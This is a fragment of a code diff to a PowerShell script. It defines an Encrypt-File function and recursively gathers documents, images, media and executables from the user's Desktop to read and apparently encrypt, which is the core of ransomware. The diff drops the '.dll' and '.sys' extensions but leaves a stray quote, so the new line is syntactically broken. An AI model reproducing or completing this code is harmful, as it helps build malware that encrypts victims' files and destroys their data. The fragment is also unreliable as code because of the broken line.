@@ -27,7 +27,7 @@ function Encrypt-File($String, $Passphrase)
 
 $DesktopPath = [Environment]::GetFolderPath("Desktop")
 
-gci $DesktopPath -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*rar","*.exe","*.jpeg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.dll","*.sys","*.ppt","*.pptx","*.csv" | %{
+gci $DesktopPath -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*rar","*.exe","*.jpeg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg",","*.ppt","*.pptx","*.csv" | %{
 
   try{
        $file = Get-Content $_ -raw;
